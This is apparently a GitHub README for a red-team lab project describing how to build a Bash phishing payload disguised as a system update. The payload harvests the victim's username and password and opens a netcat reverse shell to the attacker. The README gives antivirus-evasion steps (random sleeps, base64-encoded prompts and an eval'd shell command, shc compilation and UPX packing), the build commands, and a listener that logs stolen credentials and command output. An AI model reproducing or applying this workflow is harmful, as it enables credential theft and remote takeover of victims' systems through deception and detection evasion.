#  Custom Phishing Payload with Anti-Detection Features

**A Bash-based red team tool with obfuscated phishing payloads and capturing credentials via social engineering or any other techniques**

---

##  Features

- **Created custom phishing payload (malicious script).**
- **Applied basic evasion methods to bypass antivirus detection.**
- **Includes a listener to intercept credentials and initiate reverse shells.**
- **Listener captures credentials and remote command executions in a file on the attacker system**

---
## Workflow 
![](https://github.com/brindhasham/Lab_PT/blob/main/Custom%20Phishing%20Payload%20with%20Anti-Detection%20Features/screensnips/workfloww.png)

---

### Target machine: Linux(Ubuntu 14.04)

---

## Working

1. **Desined a bash based payload with following features:**
   - **A malicious Bash script disguised as a system update script that triggers a reverse shell and captures credentials**
   -  **To avoid detection, I would use random sleep intervals 2-6s within the script `(sleep $((RANDOM % 5 + 1))`** **Note: The time intervals vary within the code to avoid any detections**
   -  **The prompt alert message and prompt to enter password to the victim to update system can be base64 encoded to avoid any detection** for example: `echo "QWxlcnQ6TGVnYWN5IGFwcGxpY2F0aW9ucyBmb3VuZCEgU3lzdGVtIHVwZGF0ZSByZXF1aXJlZC4gClBsZWFzZSBlbnRlciB1c2VybmFtZTogCg==" | base64 -d`**
   -   **The variable used within the script should not be elablorate rather vague and unidentifiable**
   -   **The stored username and password should be then encoded using base64 to avoid detection during data exfiltration**
   -   **Use of netcat to create a reverse shell to connect with the attacker machine and again the code is encoded using base64 and stored as a variable and will simply use eval command to create an reverse shell and transfer the captured credentials `eval "$Connect"`**
2. **To further obfuscate the code,**
   ```
   sudo apt install -y build-essential gcc
   sudo apt install -y automake autoconf m4 perl
   git clone https://github.com/neurobin/shc.git
   cd shc
   ./configure
   autoreconf -fvi
   ./configure
   make
   sudo make install
   sudo apt install upx-ucl
   ```
3. **UPX (Ultimate Packer for eXecutables) is used to compress and obfuscate binary executables, not plain Bash scripts**
4. **To convert the Bash script into a binary executable, I used a tool shc (Shell Script Compiler) to compile the script into a C-based binary**
5. **The above bash commands are used to set up shc, upx**
6. **`build-essential` includes compilers like gcc**
7. **I git-cloned the [neurobin fork](https://github.com/neurobin/shc)**
8. **`sudo apt install -y automake autoconf m4 perl` The automake and autoconf was not available in my attacker system, so I installed it manually and added macro processor and perl for scripting in build process**
9. **`autoreconf -fvi`  to force regeneration of build files**
10.**`./configure `     to Re-run configuration**
11. **`make `           Now build it**
12. **After installing shc, I verfied successful installation using `shc -v`**

### At this point we set up bash script and the environment ready to obfuscate the bash script

13. **The bash script is saved as `payload.sh` in the attacker machine with execute permissions**
14. **Now to compile to binary format, I will use shc with following command**
    ```
    shc -v -r -U -f payload.sh
    ```
   - **-v: verbose output**
   - **-r: To let compiled binary to be redistributable**
   - **-f payload.sh: to the input script file.**
   - **-U: Unsets the environment variable LD_LIBRARY_PATH before executing the compiled binary. This helps prevent library path manipulation**
15. **This generates 2 files, The compiled binary executable to be used instead of original script and The C source code generated from the shell script. This is used to compile the binary.**
16. `gcc -static -o payload_binary payload.sh.x.c`
    - **This above compiles the C source file `payload.sh.x.c` into a statically linked binary executable named `payload_binary`**
17. **Now we have `payload_binary` which runs the logic of `payload.sh` without exposing the script**
18. **`upx --best --ultra-brute payload_binary`**
     - **This compresses the binary file  using UPX (Ultimate Packer for executables) with maximum compression settings**

**Now we finally have the payload_binary ready to be transferred to the attacker system by various phising methods**

19. **At the attacker side we will create a listener script for ease of function**
20.  ```bash
     #!/bin/bash
     nc -nlvp <attacker_port_specified_in_the_script> > creds_comm.txt
     ```
21. **When the victim executes the script at, which prompts for username and password, the data will be exfiltrated in base64 format using a reverse shell. Since I have also included RCE using the reverse shell, the commands from the attacker will be executed at the victim's end and the results will be stored in `creds_comm.txt`**
    
     
 ### This concludes successful custom creation of payload, obfuscation and data-exfiltration using reverse shell
